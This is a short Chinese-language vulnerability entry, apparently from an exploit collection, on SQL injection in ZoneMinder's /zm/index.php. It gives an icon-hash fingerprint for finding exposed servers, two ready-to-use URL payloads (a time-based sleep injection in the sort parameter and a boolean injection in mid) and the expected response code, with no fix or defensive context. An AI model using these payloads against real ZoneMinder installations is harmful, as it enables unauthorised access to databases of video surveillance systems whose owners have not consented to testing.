# 开源-ZoneMinder-SQL注入漏洞

开源 ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="-1218152116"`

**Payload**
```
/zm/index.php?sort=**if(now()=sysdate()%2Csleep(6)%2C0)**&order=desc&limit=20&view=request&request=watch&mid=1
/zm/index.php?limit=20&mid=-1%20OR%203*2*1=6%20AND%20000322=000322&order=desc&request=watch&sort=Id&view=request
```
- **响应特征**：200